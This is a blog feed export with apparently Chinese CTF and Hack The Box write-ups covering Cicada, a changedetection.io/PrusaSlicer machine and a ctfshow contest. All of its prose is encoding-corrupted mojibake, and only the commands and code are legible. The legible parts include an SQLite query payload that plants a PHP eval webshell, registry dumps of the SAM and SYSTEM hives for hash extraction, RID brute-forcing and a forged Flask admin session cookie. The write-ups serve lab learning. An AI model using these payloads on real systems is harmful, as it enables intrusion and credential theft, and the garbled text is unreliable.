alt="image-20250126200342570"></p><p>è¿™ä¸ªåœ°æ–¹å­˜åœ¨jamesç”¨æˆ·å¯†ç çš„hashå€¼ã€‚ </p><p>æ˜¯ä¸€ä¸ªåˆ©ç”¨bcryptç”Ÿæˆçš„å“ˆå¸Œå€¼ ç„¶åç”¨johnçˆ†ç ´ä¸€ä¸‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262009430.png" alt="image-20250126200928247"></p><p>sshç™»å½•ä¸Šå» è½¬æˆjamesç”¨æˆ·ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262010474.png" alt="image-20250126201041338"></p><h3 id="å†…ç½‘åˆ©ç”¨"><a href="#å†…ç½‘åˆ©ç”¨" class="headerlink" title="å†…ç½‘åˆ©ç”¨"></a>å†…ç½‘åˆ©ç”¨</h3><p>ifconfigå‘ç°æœ‰ä¸€ä¸ªå†…ç½‘ip ä½†æ˜¯æœåŠ¡çš„ç«¯å£ä¸çŸ¥é“ ä¸Šä¼ ä¸€ä¸ªfscan</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262032911.png" alt="image-20250126203215707"></p><p>å°†å·²ç»ç¼–è¯‘å¥½çš„fscanäºŒè¿›åˆ¶æ–‡ä»¶ä¼ é€’è¿‡å» ç„¶ååŠ ä¸€ä¸ªå¯æ‰§è¡Œçš„æƒé™ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262125007.png" alt="image-20250126212509752"></p><p>æœ‰ä¸€ä¸ªå†…ç½‘çš„æœåŠ¡ sshæ˜ å°„å‡ºæ¥ã€‚</p><h3 id="CVE-2024-32651"><a href="#CVE-2024-32651" class="headerlink" title="CVE-2024-32651"></a>CVE-2024-32651</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">5000</span>:<span class="hljs-number">172.17.0.2:5000</span> james@<span class="hljs-number">10.10.11.34</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262127594.png" alt="image-20250126212735394"></p><p>æ˜¯ä¸€ä¸ªchangedetection.io ç‰ˆæœ¬ä¿¡æ¯ä¹Ÿæœ‰ã€‚ç™»å½•çš„å¯†ç æ˜¯jamesçš„sshå¯†ç </p><p>æ˜¯ä¸€ä¸ªCVE-2024-32651 pocåˆ©ç”¨é“¾æ¥ï¼š<a href="https://www.exploit-db.com/exploits/52027">https://www.exploit-db.com/exploits/52027</a>  </p><p><a href="https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/">https://www.hacktivesecurity.com/blog/2024/05/08/cve-2024-32651-server-side-template-injection-changedetection-io/</a></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262153288.png" alt="image-20250126215351927"></p><p>æ˜¯rootæƒé™ä½†æ˜¯æ²¡å•¥ä¸œè¥¿ã€‚è¿›å»åˆ°datastoreä¸­çœ‹çœ‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262255684.png" alt="image-20250126225554582"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262254895.png" alt="image-20250126225418494"></p><p>å†backupsç›®å½•ä¸‹å‘ç°ä¸¤ä¸ªzipæ–‡ä»¶ï¼Œå°†ä¸¤ä¸ªzipæ–‡ä»¶æ‹‰ä¸‹æ¥ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262321263.png" alt="image-20250126232127886"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262327909.png" alt="image-20250126232733725"></p><p>æ˜¯ä¸€ä¸ªbræ–‡ä»¶ æ¥ç€è§£å‹ã€‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">brotli -d f<span class="hljs-number">04</span>f<span class="hljs-number">0732</span>f<span class="hljs-number">120</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span><span class="hljs-keyword">cc</span><span class="hljs-number">84</span>a<span class="hljs-number">993</span>ad<span class="hljs-number">99</span>decb<span class="hljs-number">2</span><span class="hljs-keyword">c</span>.txt.<span class="hljs-keyword">br</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262330041.png" alt="image-20250126232959921"></p><p>é‡Œé¢å­˜æ”¾ç€adamçš„ç”¨æˆ·å¯†ç ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262331375.png" alt="image-20250126233122306"></p><p>sshç™»å½•ä¸€ä¸‹ã€‚</p><h3 id="CVE-2023-47268"><a href="#CVE-2023-47268" class="headerlink" title="CVE-2023-47268"></a>CVE-2023-47268</h3><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501262337903.png" alt="image-20250126233716784"></p><p>æœç´¢prusaslicerç›¸å…³ææƒä¿¡æ¯ æ‰¾åˆ°ä¸€ä¸ªCVE CVE-2023-47268</p><p><a href="https://www.exploit-db.com/exploits/51983">https://www.exploit-db.com/exploits/51983</a> </p><p><a href="https://github.com/suce0155/prusaslicer_exploit">https://github.com/suce0155/prusaslicer_exploit</a></p><p>å‚è€ƒgithubä¸Šçš„ æ³¨æ„ä¿®æ”¹shæ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270007792.png" alt="image-20250127000700566"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270007005.png" alt="image-20250127000714908"></p><p>3mfæ–‡ä»¶æœ¬èº«å¯ä»¥è¢«è§£å‹ç¼© ä¿®æ”¹çš„æ˜¯ Slic3r_PE.configæ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270014867.png" alt="image-20250127001416764"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501270014538.png" alt="image-20250127001400320"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é¦–å…ˆé€šè¿‡gitæ³„éœ²æ‰¾åˆ°åå°åœ°å€ï¼Œç„¶åé€šè¿‡ç‰ˆæœ¬ä¿¡æ¯æ‰¾åˆ°CVEæ‰“ï¼Œå¾—åˆ°æ™®é€šæƒé™åï¼ŒæŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯ï¼Œæ”¶é›†æ•°æ®åº“çš„ä¿¡æ¯ï¼Œç™»å½•è¿›å»ï¼Œåˆ©ç”¨johnè¿›è¡Œçˆ†ç ´ï¼Œsshç™»å½•æ–°ç”¨æˆ·ï¼ŒæŸ¥çœ‹å†…ç½‘æœåŠ¡ï¼Œç„¶åæœé›†æ¼æ´å¹¶ä¸”åˆç†åˆ©ç”¨ï¼Œå†è¿›ä¸€æ­¥çš„ä¿¡æ¯æ”¶é›†ï¼Œæ‰¾åˆ°å¦å¤–ç”¨æˆ·çš„å¯†ç ï¼Œå†æ¬¡sshç™»å½•è¿›å»ï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªprusaslicerææƒçš„åˆ©ç”¨ è¿˜æ˜¯æ‰“CVEã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Linuxé¶æœºä¸­çº§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Cicada</title>
    <link href="/2025/01/17/HTB-Cicada/"/>
    <url>/2025/01/17/HTB-Cicada/</url>
    
    <content type="html"><![CDATA[<h1 id="HTB-Cicada"><a href="#HTB-Cicada" class="headerlink" title="HTB-Cicada"></a>HTB-Cicada</h1><h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501172224341.png" alt="image-20250117222429112"></p><p>ç«¯å£å¼€æ”¾ 445 åˆ©ç”¨smbclientæŸ¥çœ‹ä¸€ä¸‹å…±äº«èµ„æºã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501172233795.png" alt="image-20250117223333678"></p><p>åœ¨HRä¸‹ æ‰¾åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ ä¸‹è½½ä¸‹æ¥ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221443990.png" alt="image-20250122144303840"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>åœ¨txté‡Œé¢å¾—åˆ°ä¸€ä¸ªè´¦æˆ·é»˜è®¤çš„å¯†ç ï¼Œä½†æ˜¯ç”¨æˆ·åå¹¶ä¸çŸ¥é“ï¼Œéœ€è¦æšä¸¾ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">crackmapexec</span> smb <span class="hljs-number">10.10.11.35</span> -u  <span class="hljs-string">&quot;guest&quot;</span> -p  <span class="hljs-string">&quot; &quot;</span> --rid-brute | grep <span class="hljs-string">&quot;SidTypeUser&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221524468.png" alt="image-20250122152403374"></p><p>ç”¨è¿™äº›ç”¨æˆ·åå½“ä½œä¸€ä¸ªå­—å…¸ ã€‚</p><p>ç„¶åç”¨å‰é¢è·å–åˆ°çš„å¯†ç  è¿›è¡Œä¸€ä¸ªçˆ†ç ´ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221533284.png" alt="image-20250122153329202"></p><p>å¾—åˆ°ç”¨æˆ·åï¼šmichael.wrightson</p><p>ä¸Šé¢é€šè¿‡smbclientå¾—åˆ°çš„ç”¨æˆ·æƒé™åªèƒ½è®¿é—®HRçš„ ä½†æ˜¯DEVçš„æ²¡æƒé™è®¿é—® éœ€è¦è´¦æˆ·å¯†ç  æˆ‘ä»¬æ–°è·å–çš„è´¦æˆ·å¯†ç åŒæ ·æ²¡æœ‰æƒé™è®¿é—®DEV</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221557155.png" alt="image-20250122155726069"></p><p>é€šè¿‡â€“users æšä¸¾å…¶ä»–ç”¨æˆ·</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221602227.png" alt="image-20250122160252015"></p><p>å¾—åˆ°å¦å¤–ä¸€ä¸ªè´¦æˆ·david.oreliousçš„å¯†ç  ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221605307.png" alt="image-20250122160551175"></p><p>å‘ç°æœ‰æƒé™äº†ï¼Œç„¶åå°±æ˜¯smbclientç™»å½•è¿›å» æŸ¥çœ‹ä¿¡æ¯ã€‚</p><p>å­˜åœ¨ä¸€ä¸ªpowershellè„šæœ¬æ–‡ä»¶ ä¸‹è½½ä¸‹æ¥çœ‹çœ‹ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221608107.png" alt="image-20250122160809969"></p><p>é‡Œé¢å­˜åœ¨è´¦æˆ·åå’Œå¯†ç  evil-winrmç™»å½•ä¸€ä¸‹çœ‹çœ‹,æˆåŠŸç™»å½•ã€‚</p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221619533.png" alt="image-20250122161915462"></p><p>èƒ½å¤Ÿåˆ©ç”¨SetBackupè¿›è¡Œææƒã€‚</p><p>é¦–å…ˆå°†samå’Œsystemçš„hashå¤‡ä»½ä¸€ä¸‹ ç„¶ååˆ©ç”¨evil-winrmå°†å¤‡ä»½æ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">reg save hklm\system <span class="hljs-name">C</span>:\Users\emily.oscars.CICADA\Documents\system.hive<br><br>reg save hklm\sam <span class="hljs-name">C</span>:\Users\emily.oscars.CICADA\Documents\sam.hive<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221639022.png" alt="image-20250122163859902"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">download C:\Users\emily<span class="hljs-selector-class">.oscars</span>.CICADA\Documents\system<span class="hljs-selector-class">.hive</span> /root/system<span class="hljs-selector-class">.hive</span><br><br>download C:\Users\emily<span class="hljs-selector-class">.oscars</span>.CICADA\Documents\sam<span class="hljs-selector-class">.hive</span> /root/sam.hive<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501221701613.png" alt="image-20250122170142452"></p><p>ä¸‹è½½å®Œæˆä¹‹å é€šè¿‡secretsdump.py æœ€ç»ˆèƒ½è·å–åˆ°Administratorçš„NTLMå“ˆå¸Œ ç„¶åå†æ¬¡é€šè¿‡evil-winrmç™»å½•ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Windowsé¶æœºåˆçº§</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshowæ¸—é€èµ›å¤ç°</title>
    <link href="/2025/01/10/ctfshow_%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/"/>
    <url>/2025/01/10/ctfshow_%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="ctfshowæ¸—é€èµ›å¤ç°"><a href="#ctfshowæ¸—é€èµ›å¤ç°" class="headerlink" title="ctfshowæ¸—é€èµ›å¤ç°"></a>ctfshowæ¸—é€èµ›å¤ç°</h1><h2 id="å‰ç½®ï¼š"><a href="#å‰ç½®ï¼š" class="headerlink" title="å‰ç½®ï¼š"></a>å‰ç½®ï¼š</h2><p>æˆ‘é‚£æ—¶å€™åªåšåˆ°äº†ç¬¬äºŒç« ï¼Œç¬¬ä¸‰ç« å¾€åçš„éƒ½æ²¡åšå‡ºæ¥ï¼Œä¸»è¦æ˜¯å¤ç°3åˆ°5ç« çš„å†…å®¹,å‰ä¸¤ç« çš„å¤§æ¦‚æ€è·¯å°±æ˜¯é€šè¿‡çˆ†ç ´ï¼Œå¯ä»¥å¾—åˆ°å‹ç¼©åŒ…çš„å¯†ç ï¼Œç„¶åè§£ä¸€ä¸‹RSAå¯ä»¥å¾—åˆ°ç½‘å€ï¼Œè´¦å·å¯†ç çš„è¯ï¼Œxxx.gxv é‚£ä¸ªç½‘ç«™å­˜åœ¨ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œé€šè¿‡wpscan apiæ‰«å‡ºæ¥çš„ å¯ä»¥ä¸‹è½½config.phpå¾—åˆ°åˆå§‹çš„è´¦å·å¯†ç ï¼Œç„¶åç™»å½•è¿›å»ï¼Œå¯¹jwtè¿›è¡Œä¸€ä¸ªçˆ†ç ´ï¼Œå¾—åˆ°å¯†é’¥ï¼Œä¼ªé€ èº«ä»½ï¼Œç„¶åå°±æ˜¯æ‰«é¶æœºçš„åå°ï¼Œæœ‰ä¸€ä¸ªjsonæ–‡ä»¶ï¼Œé‡Œé¢å­˜åœ¨ä¸€äº›å¯ä»¥åˆ©ç”¨çš„API å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å– ç„¶åå°±æ˜¯åˆ©ç”¨é‚£ä¸ªssrfæ¢æµ‹å†…ç½‘ï¼Œåˆ°è¿™ä¸€æ­¥åé¢å°±å¡ç€äº†ã€‚</p><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><h4 id="ç¬¬ä¸‰ç« ï¼š"><a href="#ç¬¬ä¸‰ç« ï¼š" class="headerlink" title="ç¬¬ä¸‰ç« ï¼š"></a>ç¬¬ä¸‰ç« ï¼š</h4><p>ç™»å½•è¿›å»ä¹‹åæŸ¥æ‰¾æœ‰ç”¨çš„ä¿¡æ¯</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501152254307.png" alt="image-20250115225423182"></p><p>è¿™ä¸ªåœ°æ–¹æœ‰ä¸€ä¸ªå†…ç½‘çš„ipï¼Œä½†æ˜¯è¿™ä¸ªipå¹¶ä¸æ˜¯phpæœåŠ¡å™¨æ‰€åœ¨çš„é‚£ä¸ªip.</p><p>ç»è¿‡çˆ†ç ´ï¼Œå¯ä»¥å¾—åˆ°åœ¨172.2.205.5 è¿™ä¸ªipåœ°å€ä¸Šæœ‰ä¸€ä¸ª phpçš„æœåŠ¡ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501101859805.png" alt="image-20250110185958669"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501101905857.png" alt="image-20250110190557782"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501101900499.png" alt="image-20250110190054453"></p><p>è¿™é‡Œå½“åˆæ²¡æƒ³åˆ°ç›´æ¥æ‰§è¡Œsqlè¯­å¥ å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?dsn=sqlite:shell.php%26username=aaa%26password=bbb%26query=create table &quot;bbb&quot; (name TEXT DEFAULT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;2.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);</span><br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„æ˜¯å…ˆè®¿é—®shell.php è®©åé¢çš„file_put_contentsç”Ÿæ•ˆ ç„¶åè®¿é—®1.phpæ‰èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p><p>è¿˜æœ‰å…¶ä»–çš„å†™æ³• åŠŸèƒ½éƒ½å·®ä¸å¤š</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">CREATE TABLE eeee (id INTEGER PRIMARY KEY, php_code TEXT); </span><br><span class="language-xml">INSERT INTO eeee (php_code) VALUES (&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;6.php&#x27;</span>, <span class="hljs-string">&#x27;&lt;?php eval($_GET[2]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;);</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102022710.png" alt="image-20250110202248538"></p><p>ç„¶åé‚£ä¸ªé‚®ç®±çš„æ•°å­—ï¼ŒæŸ¥çœ‹æ ¹ç›®å½•ä¸‹çš„secret.txtæ–‡ä»¶ é‡Œé¢æ˜¯ä¸¤æ¬¡base64ç¼–ç ï¼Œè§£ç å°±è¡Œ</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102035320.png" alt="image-20250110203534262"></p><p>ç™»å½•è¿›å»ä¹‹å åœ¨çº¢è‰²é‚®ä»¶ä¸­å¯ä»¥æ‰¾åˆ°æ•°å­—</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102037826.png" alt="image-20250110203706770"></p><h4 id="ç¬¬å››ç« "><a href="#ç¬¬å››ç« " class="headerlink" title="ç¬¬å››ç« "></a>ç¬¬å››ç« </h4><p>ç¬¬å››ç« æ˜¯ä¸€ä¸ªpythonæœåŠ¡ï¼Œåœ¨ç¬¬äºŒç« ä¸­èƒ½è¯»å–åˆ°main.py.bak</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, session<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> url_for<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> redirect<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">from</span> os.path <span class="hljs-keyword">import</span> basename<br><span class="hljs-keyword">from</span> os.path <span class="hljs-keyword">import</span> join<br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;3f7a4d5a-a71a-4d9d-8d9a-d5d5d5d5d5d5&#x27;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;log server is running&#x27;</span>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_session</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;user&#x27;</span>] != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/key&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_key</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_session():<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;not authorized&quot;</span>&#125;<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/log_server_key.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            key = f.read()<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;key&#x27;</span>: key&#125;<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/set_log_option&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_log_option</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_session():<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;not authorized&quot;</span>&#125;<br><br>    logName = request.args.get(<span class="hljs-string">&#x27;logName&#x27;</span>)<br>    logFile = request.args.get(<span class="hljs-string">&#x27;logFile&#x27;</span>)<br>    app_log = logging.getLogger(logName)<br>    app_log.addHandler(logging.FileHandler(<span class="hljs-string">&#x27;./log/&#x27;</span> + logFile))<br>    app_log.setLevel(logging.INFO)<br>    clear_log_file(<span class="hljs-string">&#x27;./log/&#x27;</span> + logFile)<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;log option set successfully&#x27;</span>&#125;<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_log_content&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_log_content</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_session():<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;not authorized&quot;</span>&#125;<br><br>    logFile = request.args.get(<span class="hljs-string">&#x27;logFile&#x27;</span>)<br>    path = join(<span class="hljs-string">&#x27;log&#x27;</span>, basename(logFile))<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        content = f.read()<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;log content&#x27;</span>, <span class="hljs-string">&#x27;content&#x27;</span>: content&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear_log_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;w&#x27;</span>):<br>        <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8888</span>)<br></code></pre></td></tr></table></figure><p>å¼€å¯çš„æ˜¯8888ç«¯å£ ç„¶åipåœ°å€æ˜¯172.2.205.6</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102046780.png" alt="image-20250110204629640"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102058612.png" alt="image-20250110205836354"></p><p>ç°åœ¨æ˜¯guestèº«ä»½ éœ€è¦åˆ°adminèº«ä»½æ‰èƒ½æ‰“å¼€log_server_key.txtæ–‡ä»¶</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102100235.png" alt="image-20250110210000121"></p><p>åˆ©ç”¨flask sessionä¼ªé€  ä¼ªé€ adminèº«ä»½ã€‚</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102110302.png" alt="image-20250110211050245"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202501102115648.png" alt="image-20250110211520471"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJ<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>VyIjoiYWRtaW<span class="hljs-number">4</span>ifQ.Z<span class="hljs-number">4</span>Ecow.PdkcCtX-ixKbK_jbiuEQ-i<span class="hljs-number">7</span>yoQQ<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªä¸çŸ¥é“ä¸ºå•¥ä¸èƒ½ç›´æ¥æŠ“åŒ… ç„¶ååŠ 